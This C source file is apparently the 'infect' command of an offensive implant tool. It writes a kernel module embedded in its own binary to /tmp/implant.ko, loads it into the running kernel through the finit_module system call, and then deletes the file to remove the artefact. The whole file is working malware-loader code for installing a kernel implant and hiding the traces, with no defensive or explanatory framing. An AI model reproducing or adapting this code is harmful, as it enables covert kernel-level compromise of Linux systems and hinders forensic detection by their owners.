#include <status.h>
#include <log.h>
#include <module/infect.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <syscall.h>
#include <errno.h>

/* The implant is embedded in this binary.
 * These symbols are exposed. */
extern char _binary_implant_ko_start[];
extern char _binary_implant_ko_end[];

#ifndef TMP_PATH
#define TMP_PATH "/tmp/implant.ko"
#endif /* TMP_PATH */

#ifndef MODNAME
#define MODNAME "implant"
#endif /* MODNAME */

static int infect(void)
{
	int status = 0;

	int fd = open(TMP_PATH, O_CREAT | O_EXCL | O_WRONLY, 0700);
	if (fd < 0) {
		IMLOG_DEBUG("Failed to open %s", TMP_PATH);
		return fd;
	}

	ssize_t nbytes_required =
		_binary_implant_ko_end - _binary_implant_ko_start;
	ssize_t nbytes = write(fd, _binary_implant_ko_start, nbytes_required);

	close(fd);
	if (nbytes < nbytes_required) {
		IMLOG_DEBUG("Failed to write the required bytes");
		status = -1;
		goto f;
	}

	/* Load the kernel module.
	 * GLIBC does not provide wrapper functions around the system call.
	 *
	 * The kernel module must be open with O_RDONLY. */
	fd = open(TMP_PATH, O_RDONLY);
	if (fd < 0) {
		IMLOG_DEBUG("Failed to open %s after it has been created",
			    TMP_PATH);
		status = -1;
		goto f;
	}

	int ret = syscall(__NR_finit_module, fd, "", 0);

	close(fd);
	if (ret) {
		IMLOG_DEBUG("Failed to load kernel module");
		if (errno == EPERM)
			error("Infect requires root privilege.\n");

		status = -1;
		goto f;
	}

	alert("Infect successful.\n");

f:
	/* Remove artefact. */
	remove(TMP_PATH);
	IMLOG_DEBUG("Removed artefact from %s", TMP_PATH);
	return status;
}

int infect_command_handler(int argc, char **argv)
{
	/* TODO: There should be supported arguments for this command. */
	(void)argc;
	(void)argv;

	return infect();
}